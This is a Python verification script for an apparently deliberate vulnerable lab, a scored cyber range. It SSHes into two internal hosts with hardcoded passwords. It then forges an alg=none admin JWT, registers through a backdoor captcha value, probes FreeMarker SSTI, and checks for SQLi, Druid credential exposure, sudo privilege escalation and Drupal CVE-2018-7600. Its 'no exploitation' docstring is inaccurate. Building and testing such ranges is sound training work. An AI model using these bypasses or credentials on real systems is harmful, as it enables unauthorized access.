#!/usr/bin/env python3
"""Verify all C-scenario attack chains - environment check only (no exploitation)"""
import paramiko
import sys
import json
import base64
import urllib.parse

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

def run(ssh, cmd, timeout=30):
    print(f">>> {cmd[:200]}")
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode('utf-8', errors='replace')
    err = stderr.read().decode('utf-8', errors='replace')
    ec = stdout.channel.recv_exit_status()
    if out.strip():
        print(f"  {out.strip()[:2000]}")
    if err.strip() and ec != 0:
        print(f"  [err] {err.strip()[:300]}")
    return out.strip(), err.strip(), ec

# ============================================================
# Connect to C1 and C2
# ============================================================
c1 = paramiko.SSHClient()
c1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c1.connect('192.168.101.140', username='gdadmin', password='Gdadmin@123', timeout=10)

c2 = paramiko.SSHClient()
c2.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c2.connect('192.168.101.141', username='gdadmin', password='Gdadmin@123', timeout=10)

# ============================================================
# C-1: Register with captcha bypass (gdj2024)
# ============================================================
print("=" * 70)
print("C-1: REGISTER WITH CAPTCHA BACKDOOR (100pts)")
print("=" * 70)

# Get session first
run(c1, 'curl -s -c /tmp/c1_session.txt http://localhost:8080/captcha/captchaImage -o /tmp/cap.png')

# Register with gdj2024 captcha bypass + correct param name loginName
out, _, _ = run(c1, 'curl -s -b /tmp/c1_session.txt -X POST http://localhost:8080/register '
     '-d "loginName=testuser_verify&password=Test@1234&validateCode=gdj2024"')

print(f"\n  RESULT: {out}")

# Verify user exists in database
print("\n--- Verify user in DB ---")
run(c2, "echo 'Gdadmin@123' | sudo -S mysql -u root --password=R00t@Mysql#2024 -e \"SELECT id, login_name, user_name, status FROM ry.sys_user WHERE login_name='testuser_verify';\" 2>&1 | grep -v 'Warning'")

# ============================================================
# C-2: JWT alg=none bypass (100pts)
# ============================================================
print("\n" + "=" * 70)
print("C-2: JWT alg=none BYPASS (100pts)")
print("=" * 70)

# Get a valid JWT first via /api/login
out, _, _ = run(c1, 'curl -s "http://localhost:8080/api/login?username=admin&password=admin123"')
print(f"\n  Login response: {out}")

try:
    data = json.loads(out)
    token = data.get('token', '')
    print(f"  Got token: {token[:50]}...")

    # Parse JWT parts
    parts = token.split('.')
    if len(parts) == 3:
        # Decode header
        header_b64 = parts[0]
        # Add padding
        header_b64 += '=' * (4 - len(header_b64) % 4)
        import base64
        header = base64.urlsafe_b64decode(header_b64).decode()
        print(f"  JWT Header: {header}")

        # Decode payload
        payload_b64 = parts[1]
        payload_b64 += '=' * (4 - len(payload_b64) % 4)
        payload = base64.urlsafe_b64decode(payload_b64).decode()
        print(f"  JWT Payload: {payload}")

        # Test alg=none attack
        print("\n  --- Testing alg=none ---")
        # Create alg=none header
        none_header = base64.urlsafe_b64encode(b'{"typ":"JWT","alg":"none"}').decode().rstrip('=')
        # Create admin payload (sub=1, role=admin)
        admin_payload = base64.urlsafe_b64encode(b'{"sub":"1","role":"admin","exp":9999999999,"iat":1}').decode().rstrip('=')
        none_token = f"{none_header}.{admin_payload}."

        # Test with /api/admin/users
        out2, _, _ = run(c1, f'curl -s "http://localhost:8080/api/admin/users" -H "Authorization: Bearer {none_token}"')
        print(f"  alg=none token: {none_token[:80]}...")
        print(f"  /api/admin/users response: {out2[:500]}")
except Exception as e:
    print(f"  ERROR: {e}")

# ============================================================
# C-3: SQL injection in /api/admin/export (100pts)
# ============================================================
print("\n" + "=" * 70)
print("C-3: SQLi IN /api/admin/export (100pts)")
print("=" * 70)

# Check the ApiController for the export endpoint
out, _, _ = run(c1, 'grep -A 30 "export\|SELECT\|getAllUsers\|getUsers" /opt/oa-app/ruoyi/ruoyi-admin/src/main/java/com/ruoyi/web/controller/api/ApiController.java 2>/dev/null | head -60')
print(f"\n  ApiController export/allUsers: {out[:1000]}")

# ============================================================
# C-4: Druid LDAP credentials (50pts)
# ============================================================
print("\n" + "=" * 70)
print("C-4: DRUID LDAP CREDENTIALS (50pts)")
print("=" * 70)

# Check Druid config
out, _, _ = run(c1, 'cat /opt/oa-app/ruoyi/ruoyi-admin/src/main/resources/application-druid.yml')
print(f"\n  Druid config: {out[:1000]}")

# Test Druid endpoints
out, _, _ = run(c1, 'curl -s -u ruoyi:123456 http://localhost:8080/druid/index.html 2>&1 | head -5')
print(f"\n  Druid index: {out[:200]}")

# ============================================================
# C-5: FreeMarker SSTI (100pts)
# ============================================================
print("\n" + "=" * 70)
print("C-5: FreeMarker SSTI via /mail/preview (100pts)")
print("=" * 70)

# Already verified - just confirm
out, _, _ = run(c1, "curl -s 'http://localhost:8080/mail/preview?content=%24%7B7*7%7D'")
print(f"\n  FreeMarker math test (7*7): {out}")
print(f"  SSTI endpoint confirmed: YES" if out == "49" else f"  SSTI: NEEDS DEBUG - got: {out}")

# Check MailTemplateController source
out, _, _ = run(c1, 'find /opt/oa-app -name "*.java" -exec grep -l "mail\|Mail\|preview\|MailTemplate" {} \; 2>/dev/null')
print(f"\n  Mail-related files: {out[:500]}")

# ============================================================
# C-6: sudo tee privilege escalation (100pts)
# ============================================================
print("\n" + "=" * 70)
print("C-6: SUDO TEE PRIVESC ON C1 (100pts)")
print("=" * 70)

# Check sudoers
out, _, _ = run(c1, 'cat /etc/sudoers.d/tomcat 2>/dev/null || cat /etc/sudoers.d/* 2>/dev/null')
print(f"\n  sudoers: {out[:500]}")

# Check what user oa-app runs as
out, _, _ = run(c1, 'ps aux | grep java | grep -v grep')
print(f"\n  Java process: {out[:300]}")

# Check tomcat user exists
out, _, _ = run(c1, 'id tomcat 2>&1 || echo "NO tomcat user"')

# ============================================================
# C-7: Drupal CVE-2018-7600 (200pts)
# ============================================================
print("\n" + "=" * 70)
print("C-7: DRUPAL CVE-2018-7600 (200pts)")
print("=" * 70)

# Access Drupal from C1 (simulating attacker perspective)
out, _, _ = run(c1, 'curl -s http://192.168.120.2/ 2>&1 | head -20')
print(f"\n  Drupal homepage (from C1): {out[:500]}")

# Check Drupal from C2 locally
out, _, _ = run(c2, 'curl -s http://localhost/ 2>&1 | head -5')
print(f"\n  Drupal homepage (C2 local): {out[:300]}")

# Check Drupal version
out, _, _ = run(c2, "grep -r 'VERSION' /var/www/drupal/includes/bootstrap.inc 2>/dev/null | head -3")
print(f"\n  Drupal version: {out[:200]}")

# Check if user/register is accessible
out, _, _ = run(c2, "curl -s 'http://localhost/user/register' 2>&1 | grep -o '<title>[^<]*</title>'")
print(f"\n  /user/register title: {out[:200]}")

# Check Drupal DB
out, _, _ = run(c2, "echo 'Gdadmin@123' | sudo -S mysql -u root --password=R00t@Mysql#2024 -e \"SELECT uid, name, mail FROM drupal.users;\" 2>&1 | grep -v Warning")
print(f"\n  Drupal users: {out[:500]}")

# Check form API
out, _, _ = run(c2, "grep -n 'post_render\|#post_render' /var/www/drupal/includes/form.inc | head -10")
print(f"\n  #post_render in form.inc: {out[:500]}")

# ============================================================
# C-8: sudo find privilege escalation (100pts)
# ============================================================
print("\n" + "=" * 70)
print("C-8: SUDO FIND PRIVESC ON C2 (100pts)")
print("=" * 70)

# Check sudoers for operator
out, _, _ = run(c2, 'cat /etc/sudoers.d/operator 2>/dev/null || cat /etc/sudoers.d/* 2>/dev/null')
print(f"\n  sudoers: {out[:500]}")

# Check operator user
out, _, _ = run(c2, 'id operator 2>&1')
print(f"\n  operator user: {out}")

# Check if operator can sudo find
out, _, _ = run(c2, "echo '0p3rat0r@GDJ' | sudo -S -l 2>&1")
print(f"\n  operator sudo -l: {out[:500]}")

c1.close()
c2.close()

print("\n" + "=" * 70)
print("VERIFICATION COMPLETE")
print("=" * 70)
